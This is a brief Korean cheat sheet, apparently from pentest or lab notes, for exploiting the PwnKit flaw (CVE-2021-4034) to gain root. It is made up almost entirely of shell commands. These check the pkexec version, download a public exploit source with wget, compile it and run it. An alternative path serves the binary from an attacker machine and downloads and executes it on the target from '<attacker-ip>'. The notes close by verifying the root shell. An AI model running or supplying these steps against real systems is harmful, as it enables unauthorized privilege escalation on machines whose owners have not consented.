```bash
pkexec --version
```

> 버전이 0.105 이하면 CVE-2021-4034 (PwnKit) 취약

---

## 🪜 Exploit (수동 방식)

1. Exploit 소스 저장

```bash
# 설치
wget https://raw.githubusercontent.com/berdav/CVE-2021-4034/main/pwnkit.c
# 컴파일
gcc pwnkit.c -o pwnkit
# 실행
./pwnkit

```

만약 `gcc` 안 되면 로컬에서 컴파일 후 업로드:

```bash
# 공격자 머신에서:
gcc pwnkit.c -o pwnkit

# 업로드:
python3 -m http.server 8000
```

```bash
# 대상 머신에서:
wget http://<attacker-ip>:8000/pwnkit
chmod +x pwnkit
./pwnkit
```

# 쉘 확인

```bash
whoami
id
```
